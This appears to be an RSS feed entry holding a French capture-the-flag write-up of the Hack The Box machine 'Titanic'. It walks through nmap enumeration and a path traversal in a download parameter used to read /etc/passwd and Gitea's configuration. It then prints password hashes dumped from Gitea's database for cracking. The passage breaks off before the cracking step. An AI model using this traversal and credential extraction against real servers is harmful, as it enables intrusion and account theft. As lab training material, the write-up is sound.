@@ -1,0 +1,356 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Path Traversal on 01MI</title><link>https://01MI.github.io/fr/tags/path-traversal/</link><description>Recent content in Path Traversal on 01MI</description><generator>Hugo -- gohugo.io</generator><language>fr</language><lastBuildDate>Sat, 21 Jun 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://01MI.github.io/fr/tags/path-traversal/index.xml" rel="self" type="application/rss+xml"/><item><title>Titanic - Linux Easy - HTB Writeup</title><link>https://01MI.github.io/fr/p/titanic-htb-writeup-linux-easy/</link><pubDate>Sat, 21 Jun 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/fr/p/titanic-htb-writeup-linux-easy/</guid><description>&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Titanic.PNG" alt="Featured image of post Titanic - Linux Easy - HTB Writeup" />&lt;h2 id="résumé">Résumé
+&lt;/h2>&lt;p>User: Path traversal&lt;br>
+Root: Execution de code arbitraire via CVE-2024-41817(ImageMagick).&lt;/p>
+&lt;h2 id="enumeration">Enumeration
+&lt;/h2>&lt;p>A l&amp;rsquo;aide d&amp;rsquo;un scan nmap, nous pouvons identifier un service web sur le port 80 et SSH sur le port 22.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 3
+&lt;/span>&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 7
+&lt;/span>&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="mi">80&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">22&lt;/span> &lt;span class="mf">10.129.175.139&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span> &lt;span class="nx">VERSION&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">OpenSSH&lt;/span> &lt;span class="mf">8.9&lt;/span>&lt;span class="nx">p1&lt;/span> &lt;span class="nx">Ubuntu&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="nx">ubuntu0&lt;/span>&lt;span class="mf">.10&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span> &lt;span class="nx">Linux&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">protocol&lt;/span> &lt;span class="mf">2.0&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">ssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">hostkey&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="mi">73&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">76&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">eb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">04&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">f1&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">fe&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">c9&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">e9&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">80&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">44&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">46&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ECDSA&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="mi">256&lt;/span> &lt;span class="nx">d5&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">bd&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">86&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">eb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">88&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">63&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">88&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mo">04&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">ED25519&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">80&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span> &lt;span class="nx">Apache&lt;/span> &lt;span class="nx">httpd&lt;/span> &lt;span class="mf">2.4.52&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">title&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Did&lt;/span> &lt;span class="nx">not&lt;/span> &lt;span class="nx">follow&lt;/span> &lt;span class="nx">redirect&lt;/span> &lt;span class="nx">to&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//titanic.htb/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">server&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">header&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">Apache&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">2.4.52&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">methods&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>&lt;span class="nx">_&lt;/span> &lt;span class="nx">Supported&lt;/span> &lt;span class="nx">Methods&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">GET&lt;/span> &lt;span class="nx">HEAD&lt;/span> &lt;span class="nx">POST&lt;/span> &lt;span class="nx">OPTIONS&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;h2 id="utilisateur">Utilisateur
+&lt;/h2>&lt;h3 id="path-traversal">Path traversal
+&lt;/h3>&lt;p>En explorant &lt;code>titanic.htb&lt;/code>, on remarque que si l&amp;rsquo;on soumet le formulaire de booking, un fichier contenant nos éléments de réservation au format JSON est téléchargé.&lt;br>
+&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Titanic-web.png"
+width="1293"
+height="681"
+srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Titanic-web_hu_ddb956ceb2724edd.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Titanic-web_hu_bbcc5800f990521c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="189"
+data-flex-basis="455px"
+>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="nx">a41afb2&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">469&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">d75&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">faf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">c1b70d398be&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">json&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">jq&lt;/span> &lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;name&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;test&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;email&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;test@test.com&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;phone&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;test-01&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;date&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;2025-06-18&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;cabin&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s">&amp;#34;Deluxe&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+Côté burp, le paramètre &lt;code>ticket&lt;/code> via &lt;code>/download&lt;/code> permet de spécifier le fichier à télécharger.&lt;br>
+&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-ticket.png"
+width="972"
+height="315"
+srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-ticket_hu_f4731d2344060d02.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-ticket_hu_aa7eb074421b0fe0.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="308"
+data-flex-basis="740px"
+>&lt;br>
+L&amp;rsquo;absence de controle ou de validation sur ce paramètre nous permet de lire des fichiers sur la machine.&lt;br>
+Ce path traversal, nous permet de récupérer les informations suivantes:&lt;br>
+&lt;code>/etc/passwd&lt;/code> nous indique l&amp;rsquo;existence de l&amp;rsquo;utilisateur &lt;code>developer&lt;/code>.&lt;br>
+&lt;code>/etc/hosts&lt;/code> nous permet de récupérer un nouveau sous-domaine, &lt;code>dev&lt;/code>.
+&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI1.png"
+width="1146"
+height="394"
+srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI1_hu_398ef87eee89ccdf.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI1_hu_cf400f71c78cf790.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="290"
+data-flex-basis="698px"
+>&lt;br>
+&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI2.png"
+width="1064"
+height="352"
+srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI2_hu_1b6ed4cfea7e44b1.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Burp-LFI2_hu_cd583e94cbca5a7e.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="302"
+data-flex-basis="725px"
+>&lt;/p>
+&lt;h3 id="gitea">Gitea
+&lt;/h3>&lt;p>Pour l&amp;rsquo;instant, on ne peut pas aller plus loin, explorons &lt;code>dev.titanic.htb&lt;/code>.&lt;br>
+On trouve une instance de &lt;a class="link" href="https://about.gitea.com/" target="_blank" rel="noopener"
+>Gitea&lt;/a>, un outil de versionning auto-herbergé utilisant git.&lt;br>
+&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-1.png"
+width="628"
+height="352"
+srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-1_hu_224b01fb6060a811.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-1_hu_6ab8ac4d6ed83518.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="178"
+data-flex-basis="428px"
+>&lt;br>
+En explorant les repo accessibles publiquement, on trouve &lt;code>docker-config&lt;/code>et &lt;code>flask-app&lt;/code>.&lt;br>
+&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-2.png"
+width="893"
+height="252"
+srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-2_hu_18f51c3609337f0f.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-2_hu_4256cc69bc2f751d.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="354"
+data-flex-basis="850px"
+>&lt;br>
+Dans le repo &lt;code>docker-config&lt;/code>, on trouve des identifiants &lt;code>MySQL&lt;/code> dans &lt;code>/mysql/docker-compose.yml&lt;/code>.&lt;br>
+Le scan nmap n&amp;rsquo;a pas permis d&amp;rsquo;identifier un accès MySQL, on garde ces identifiants de côté.&lt;br>
+&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-3.png"
+width="290"
+height="359"
+srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-3_hu_596b3fdf310276eb.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-3_hu_f8ecd78027762aec.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="80"
+data-flex-basis="193px"
+>&lt;br>
+Toujours dans ce même repository, on trouve dans &lt;code>/gitea/docker-compose.yml&lt;/code>, le chemin vers un volume.&lt;br>
+&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-volume.png"
+width="400"
+height="341"
+srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-volume_hu_9f7270978027f8b8.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-volume_hu_3c048130cc739e3f.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="117"
+data-flex-basis="281px"
+>&lt;br>
+En utilisant ce chemin, le path traversal précédemment trouvé et la documentation de Gitea, on peut récupérer le fichier de configuration de Gitea.&lt;br>
+Après plusieurs tentatives, il se situe dans &lt;code>/home/developer/gitea/data/gitea/conf/app.ini&lt;/code>.&lt;br>
+Dans ce fichier de conf, on trouve le chemin de la &lt;code>BDD&lt;/code> Gitea.&lt;br>
+&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-4.png"
+width="1247"
+height="361"
+srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-4_hu_402a332ce390f6ec.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-4_hu_1aeb873caa9af4ee.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="345"
+data-flex-basis="829px"
+>&lt;br>
+&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-5.png"
+width="1249"
+height="349"
+srcset="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-5_hu_c4933f9730d39bd3.png 480w, https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Gitea-5_hu_ac9057beb808c996.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="357"
+data-flex-basis="858px"
+>&lt;br>
+On passe par le site pour la récupérer.&lt;br>
+En explorant cette base de données avec &lt;code>sqlite3&lt;/code>, on peut récupérer les hash de &lt;code>developer&lt;/code> et &lt;code>administrator&lt;/code>.&lt;br>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">sqlite3&lt;/span> &lt;span class="nx">gitea&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">db&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sqlite&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="k">select&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="nx">from&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">administrator&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">enabled&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">pbkdf2&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">50000&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">70&lt;/span>&lt;span class="nx">a5bd0c1a5d23caa49030172cdcabdc&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">d149e5fbd1b20cf31db3e3c6a28fc9b&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">en&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">US&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="mi">1722595379&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1722597477&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1722597477&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mf">2e1&lt;/span>&lt;span class="nx">e70639ac6b0eecbdab4a3d19e0f44&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">gitea&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">auto&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">2&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">enabled&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">pbkdf2&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">50000&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="mi">50&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="nx">ce6f07fc9b557bc070fa7bef76a0d15&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="nx">bf3e3452b78544f8bee9400d6936d34&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">en&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">US&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="mi">1722595646&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1722603397&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1722603397&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">e2d95b7e207e432f62f3508be406c11b&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">gitea&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">auto&lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="mi">0&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+Les hashs sont au format PBKDF2 et peuvent être convertis à l’aide de &lt;a class="link" href="https://github.com/hashcat/hashcat/pull/4154/files#diff-ccd519555457fa8e0c74b0dc7bd66727216dd446c7bcff8cd5196fe919e2b000" target="_blank" rel="noopener"
+>gitea2hashcat.py&lt;/a> pour être compatibles avec Hashcat et ensuite casser le mot de passe du compte &lt;code>developer&lt;/code>.
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">6
+&lt;/span>&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
